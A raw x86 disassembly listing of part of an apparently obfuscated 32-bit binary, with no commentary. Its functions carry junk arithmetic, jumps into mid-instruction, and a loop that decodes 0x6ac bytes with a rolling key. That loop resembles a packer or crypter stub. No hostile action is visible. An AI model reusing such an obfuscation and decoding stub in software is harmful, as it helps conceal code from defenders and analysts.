  4d10df:	pop    ecx
  4d10e0:	push   ecx
  4d10e1:	mov    eax,0x0
  4d10e6:	push   eax
  4d10e7:	call   0x4d0cec
  4d10ec:	add    esp,0x4
  4d10ef:	pop    ecx
  4d10f0:	push   ecx
  4d10f1:	push   0x0
  4d10f3:	call   0x4d08bc
  4d10f8:	add    esp,0x4
  4d10fb:	pop    ecx
  4d10fc:	add    esp,0x30
  4d10ff:	pop    ebp
  4d1100:	ret    
  4d1101:	add    BYTE PTR [eax],al
  4d1103:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1109:	sub    esp,0x54
  4d110c:	lea    edi,ds:0x4d3188
  4d1112:	and    edx,DWORD PTR [edi-0x170]
  4d1118:	push   edi
  4d1119:	push   ebx
  4d111a:	push   ebx
  4d111b:	push   edx
  4d111c:	call   0x4d0a64
  4d1121:	add    esp,0xc
  4d1124:	pop    edi
  4d1125:	push   edi
  4d1126:	push   0x0
  4d1128:	call   0x4d0cec
  4d112d:	add    esp,0x4
  4d1130:	pop    edi
  4d1131:	push   edi
  4d1132:	mov    ecx,0x0
  4d1137:	push   ecx
  4d1138:	call   0x4d07f0
  4d113d:	add    esp,0x4
  4d1140:	pop    edi
  4d1141:	add    esp,0x54
  4d1144:	pop    ebp
  4d1145:	ret    
  4d1146:	add    BYTE PTR [eax],al
  4d1148:	mov    edi,edi
  4d114a:	push   ebp
  4d114b:	mov    ebp,esp
  4d114d:	sub    esp,0x40
  4d1150:	lea    edx,[edi+0x14]
  4d1153:	mov    eax,DWORD PTR [ebp-0x3c]
  4d1156:	push   edx
  4d1157:	mov    ebx,0x0
  4d115c:	push   ebx
  4d115d:	call   0x4d07e4
  4d1162:	add    esp,0x4
  4d1165:	pop    edx
  4d1166:	push   edx
  4d1167:	push   DWORD PTR [edx+0xe8]
  4d116d:	push   edi
  4d116e:	push   DWORD PTR [edx+0x54]
  4d1171:	call   0x4d0930
  4d1176:	add    esp,0xc
  4d1179:	pop    edx
  4d117a:	push   edx
  4d117b:	push   0x0
  4d117d:	call   0x4d0af8
  4d1182:	add    esp,0x4
  4d1185:	pop    edx
  4d1186:	add    esp,0x40
  4d1189:	pop    ebp
  4d118a:	ret    
  4d118b:	add    BYTE PTR [edi-0x1],bl
  4d118e:	adc    eax,0x4d2010
  4d1193:	call   edi
  4d1195:	add    BYTE PTR [eax],al
  4d1197:	add    BYTE PTR [edi-0x1],bl
  4d119a:	adc    eax,0x4d2084
  4d119f:	call   edi
  4d11a1:	add    BYTE PTR [eax],al
  4d11a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11a9:	sub    esp,0x58
  4d11ac:	mov    DWORD PTR [ecx-0x50],0x4c6a
  4d11b3:	lea    edx,ds:0x4d3190
  4d11b9:	push   edx
  4d11ba:	push   0x6ac
  4d11bf:	mov    edx,0x6ac
  4d11c4:	push   edx
  4d11c5:	mov    edi,0x40001
  4d11ca:	push   edi
  4d11cb:	mov    edx,0x8629859a
  4d11d0:	push   DWORD PTR [edx+0x7a239a86]
  4d11d6:	sub    DWORD PTR [esp],0x2
  4d11da:	mov    edx,0x4d201c
  4d11df:	pop    DWORD PTR [edx]
  4d11e1:	call   0x4d0e2c
  4d11e6:	add    esp,0x4
  4d11e9:	xchg   DWORD PTR [esp],eax
  4d11ec:	mov    edx,eax
  4d11ee:	pop    DWORD PTR [edx-0x84]
  4d11f4:	mov    edi,DWORD PTR [edx-0x84]
  4d11fa:	mov    ecx,edi
  4d11fc:	sub    edi,edi
  4d11fe:	dec    edi
  4d11ff:	and    edi,0x4d0014
  4d1205:	mov    ebx,0x7ec7f445
  4d120a:	push   0x6ac
  4d120f:	pop    eax
  4d1210:	test   eax,eax
  4d1212:	je     0x4d1230
  4d1214:	add    eax,0xfffffffc
  4d1217:	xor    esi,esi
  4d1219:	push   DWORD PTR [edi+esi*1]
  4d121c:	add    DWORD PTR [esp],ebx
  4d121f:	pop    DWORD PTR [ecx+esi*2]
  4d1222:	dec    DWORD PTR [ecx]
  4d1224:	xor    ebx,ebx
  4d1226:	add    ebx,DWORD PTR [edi]
  4d1228:	add    edi,0x4
  4d122b:	add    ecx,0x4
  4d122e:	jmp    0x4d1210
  4d1230:	push   edx
  4d1231:	mov    edx,0x0
  4d1236:	push   edx
  4d1237:	call   0x4d07e4
  4d123c:	add    esp,0x4
  4d123f:	pop    edx
  4d1240:	add    esp,0x58
  4d1243:	pop    ebp
  4d1244:	ret    
  4d1245:	add    BYTE PTR [eax],al
  4d1247:	add    BYTE PTR [edi-0x1],bl
  4d124a:	adc    eax,0x4d2088
  4d124f:	call   edi
  4d1251:	add    BYTE PTR [eax],al
  4d1253:	add    BYTE PTR [edi-0x1],bl
  4d1256:	adc    eax,0x4d2018
  4d125b:	call   edi
  4d125d:	add    BYTE PTR [eax],al
  4d125f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1265:	sub    esp,0x60
  4d1268:	mov    esi,0x4d3104
  4d126d:	adc    DWORD PTR [esi-0xd4],esi
  4d1273:	push   esi
  4d1274:	push   ecx
  4d1275:	push   DWORD PTR [esi+0x104]
  4d127b:	push   ebx
  4d127c:	call   0x4d0b60
  4d1281:	add    esp,0xc
  4d1284:	pop    esi
  4d1285:	call   0x4d0744
  4d128a:	add    esp,0x4
  4d128d:	mov    edi,0x0
  4d1292:	push   edi
  4d1293:	call   0x4d0f5c
  4d1298:	add    esp,0x4
  4d129b:	add    esp,0x60
  4d129e:	pop    ebp
  4d129f:	ret    
  4d12a0:	mov    edi,edi
  4d12a2:	push   ebp
  4d12a3:	mov    ebp,esp
  4d12a5:	sub    esp,0x4c
  4d12a8:	lea    ebx,ds:0x4d31ec
  4d12ae:	and    eax,ebx
  4d12b0:	push   ebx
  4d12b1:	push   esi
  4d12b2:	push   DWORD PTR [ebx+0x134]
  4d12b8:	push   DWORD PTR [ebx+0x1d4]
  4d12be:	push   DWORD PTR [ebx+0x1ec]
  4d12c4:	call   0x4d09bc
  4d12c9:	add    esp,0x10
  4d12cc:	pop    ebx
  4d12cd:	lea    eax,[ebx-0x1ec]
  4d12d3:	push   eax
  4d12d4:	call   0x4d0d50
  4d12d9:	add    esp,0x4
  4d12dc:	test   eax,eax
  4d12de:	jne    0x4d12ce
  4d12e0:	call   0x4d0744
  4d12e5:	add    esp,0x4
  4d12e8:	add    esp,0x4c
  4d12eb:	pop    ebp
  4d12ec:	ret    
  4d12ed:	add    BYTE PTR [eax],al
  4d12ef:	add    BYTE PTR [edi-0x1],bl
  4d12f2:	adc    eax,0x4d2078
  4d12f7:	call   edi
  4d12f9:	add    BYTE PTR [eax],al
  4d12fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1301:	sub    esp,0x24
  4d1304:	mov    ebx,0x4d3068
  4d1309:	sbb    DWORD PTR [ebx-0x28],0xffffffa4
  4d130d:	push   0x0
  4d130f:	call   0x4d0f5c
  4d1314:	add    esp,0x4
  4d1317:	push   ebx
  4d1318:	push   DWORD PTR [ebx+0x1ac]
  4d131e:	push   edx
  4d131f:	call   0x4d07fc
  4d1324:	add    esp,0x8
  4d1327:	pop    ebx
  4d1328:	lea    edi,[ebx-0x68]
  4d132b:	push   edi
  4d132c:	call   0x4d0d50
  4d1331:	add    esp,0x4
  4d1334:	test   eax,eax
  4d1336:	jne    0x4d1329
  4d1338:	add    esp,0x24
  4d133b:	pop    ebp
  4d133c:	ret    
  4d133d:	add    BYTE PTR [eax],al
  4d133f:	add    BYTE PTR [edi-0x1],bl
  4d1342:	adc    eax,0x4d2054
  4d1347:	call   edi
  4d1349:	add    BYTE PTR [eax],al
  4d134b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1351:	sub    esp,0x5c
  4d1354:	mov    ecx,0x4d3048
  4d1359:	add    edx,DWORD PTR [ecx+0x168]
  4d135f:	push   ecx
  4d1360:	call   0x4d151c
  4d1365:	add    esp,0x4
  4d1368:	pop    ecx
  4d1369:	push   ecx
  4d136a:	push   esi
  4d136b:	push   edi
  4d136c:	push   eax
  4d136d:	call   0x4d0c4c
  4d1372:	add    esp,0xc
  4d1375:	pop    ecx
  4d1376:	push   ecx
  4d1377:	call   0x4d0744
  4d137c:	add    esp,0x4
  4d137f:	pop    ecx
  4d1380:	add    esp,0x5c
  4d1383:	pop    ebp
  4d1384:	ret    
  4d1385:	add    BYTE PTR [eax],al
  4d1387:	add    BYTE PTR [edi-0x1],bl
  4d138a:	adc    eax,0x4d2014
  4d138f:	call   edi
  4d1391:	add    BYTE PTR [eax],al
  4d1393:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1399:	sub    esp,0x5c
  4d139c:	lea    eax,ds:0x4d3040
  4d13a2:	sbb    DWORD PTR [eax+0x1a0],esi
  4d13a8:	push   eax
  4d13a9:	push   0xfffffff4
  4d13ab:	call   0x4d0f50
  4d13b0:	add    esp,0x4
  4d13b3:	pop    eax
  4d13b4:	push   eax
  4d13b5:	push   ecx
  4d13b6:	push   DWORD PTR [eax+0xd0]
  4d13bc:	push   DWORD PTR [eax+0x144]
  4d13c2:	push   DWORD PTR [eax+0x48]
  4d13c5:	call   0x4d0f68
  4d13ca:	add    esp,0x10
  4d13cd:	pop    eax
  4d13ce:	push   eax
  4d13cf:	push   0x0
  4d13d1:	call   0x4d072c
  4d13d6:	add    esp,0x4
  4d13d9:	pop    eax
  4d13da:	add    esp,0x5c
  4d13dd:	pop    ebp
  4d13de:	ret    
  4d13df:	add    BYTE PTR [edi-0x1],bl
  4d13e2:	adc    eax,0x4d2094
  4d13e7:	call   edi
  4d13e9:	add    BYTE PTR [eax],al
  4d13eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13f1:	sub    esp,0x2c
  4d13f4:	mov    edx,0x4d3194
  4d13f9:	cmp    edx,0x292c
  4d13ff:	jbe    0x4d13ef
  4d1401:	push   edx
  4d1402:	push   0x0
  4d1404:	call   0x4d0f5c
  4d1409:	add    esp,0x4
  4d140c:	pop    edx
  4d140d:	push   edx
  4d140e:	push   eax
  4d140f:	push   DWORD PTR [edx+0x184]
  4d1415:	push   DWORD PTR [edx+0x154]
  4d141b:	push   esi
  4d141c:	call   0x4d1488
  4d1421:	add    esp,0x10
  4d1424:	pop    edx
  4d1425:	push   edx
  4d1426:	call   0x4d0744
  4d142b:	add    esp,0x4
  4d142e:	pop    edx
  4d142f:	add    esp,0x2c
  4d1432:	pop    ebp
  4d1433:	ret    
  4d1434:	pop    edi
  4d1435:	call   DWORD PTR ds:0x4d208c
  4d143b:	call   edi
  4d143d:	add    BYTE PTR [eax],al
  4d143f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1445:	sub    esp,0x20
  4d1448:	mov    edx,0x4d3120
  4d144d:	sub    edi,edx
  4d144f:	push   edx
  4d1450:	mov    edi,0x0
  4d1455:	push   edi
  4d1456:	call   0x4d156c
  4d145b:	add    esp,0x4
  4d145e:	pop    edx
  4d145f:	push   edx
  4d1460:	push   eax
  4d1461:	push   edi
  4d1462:	push   ecx
  4d1463:	call   0x4d0da0
  4d1468:	add    esp,0xc
  4d146b:	pop    edx
  4d146c:	push   edx
  4d146d:	call   0x4d151c
  4d1472:	add    esp,0x4
  4d1475:	pop    edx
  4d1476:	add    esp,0x20
  4d1479:	pop    ebp
  4d147a:	ret    
  4d147b:	add    BYTE PTR [edi-0x1],bl
  4d147e:	adc    eax,0x4d204c
  4d1483:	call   edi
  4d1485:	add    BYTE PTR [eax],al
  4d1487:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d148d:	sub    esp,0x20
  4d1490:	mov    edi,0x4d30e4
  4d1495:	sbb    edx,esi
  4d1497:	push   edi
  4d1498:	push   DWORD PTR [edi+0x130]
  4d149e:	push   ecx
  4d149f:	push   DWORD PTR [edi+0x11c]
  4d14a5:	call   0x4d0b04
  4d14aa:	add    esp,0xc
  4d14ad:	pop    edi
  4d14ae:	push   edi
  4d14af:	mov    edx,0x0
  4d14b4:	push   edx
  4d14b5:	call   0x4d07e4
  4d14ba:	add    esp,0x4
  4d14bd:	pop    edi
  4d14be:	push   edi
  4d14bf:	mov    esi,0x0
  4d14c4:	push   esi
  4d14c5:	call   0x4d0a0c
  4d14ca:	add    esp,0x4
  4d14cd:	pop    edi
  4d14ce:	add    esp,0x20
  4d14d1:	pop    ebp
  4d14d2:	ret    
  4d14d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d9:	sub    esp,0x38
  4d14dc:	lea    edi,[esi-0x80]
  4d14e2:	adc    edx,DWORD PTR [ebp-0x34]
  4d14e5:	push   edi
  4d14e6:	push   DWORD PTR [edi+0x60]
  4d14e9:	push   eax
  4d14ea:	push   DWORD PTR [edi+0x108]
  4d14f0:	call   0x4d08c8
  4d14f5:	add    esp,0xc
  4d14f8:	pop    edi
  4d14f9:	push   edi
  4d14fa:	push   0x0
  4d14fc:	call   0x4d147c
  4d1501:	add    esp,0x4
  4d1504:	pop    edi
  4d1505:	push   edi
  4d1506:	mov    edx,0x0
  4d150b:	push   edx
  4d150c:	call   0x4d08bc
  4d1511:	add    esp,0x4
  4d1514:	pop    edi
  4d1515:	add    esp,0x38
  4d1518:	pop    ebp
  4d1519:	ret    
  4d151a:	add    BYTE PTR [eax],al
  4d151c:	pop    edi
  4d151d:	call   DWORD PTR ds:0x4d2028
  4d1523:	call   edi
  4d1525:	add    BYTE PTR [eax],al
  4d1527:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d152d:	sub    esp,0x60
  4d1530:	mov    eax,0x4d30bc
  4d1535:	adc    edi,0xffffa37b
  4d153b:	push   eax
  4d153c:	push   0x0
  4d153e:	call   0x4d07f0
  4d1543:	add    esp,0x4
  4d1546:	pop    eax
  4d1547:	push   eax
  4d1548:	push   DWORD PTR [eax+0x6c]
  4d154b:	push   edi
  4d154c:	push   DWORD PTR [eax+0x1a8]
  4d1552:	push   esi
  4d1553:	call   0x4d0f04
  4d1558:	add    esp,0x10
  4d155b:	pop    eax
  4d155c:	push   eax
  4d155d:	call   0x4d0744
  4d1562:	add    esp,0x4
  4d1565:	pop    eax
  4d1566:	add    esp,0x60
  4d1569:	pop    ebp
  4d156a:	ret    
  4d156b:	add    BYTE PTR [edi-0x1],bl
  4d156e:	adc    eax,0x4d2034
  4d1573:	call   edi
  4d1575:	add    BYTE PTR [eax],al
  4d1577:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d157d:	sub    esp,0x48
  4d1580:	mov    esi,0x4d31dc
  4d1585:	sub    ecx,DWORD PTR [ebp-0x30]
  4d1588:	push   esi
  4d1589:	push   edx
  4d158a:	push   DWORD PTR [esi+0x12c]
  4d1590:	call   0x4d1440
  4d1595:	add    esp,0x8
  4d1598:	pop    esi
  4d1599:	push   0x0
  4d159b:	call   0x4d072c
  4d15a0:	add    esp,0x4
  4d15a3:	push   0x0
  4d15a5:	call   0x4d07f0
  4d15aa:	add    esp,0x4
  4d15ad:	add    esp,0x48
  4d15b0:	pop    ebp
  4d15b1:	ret    
	...
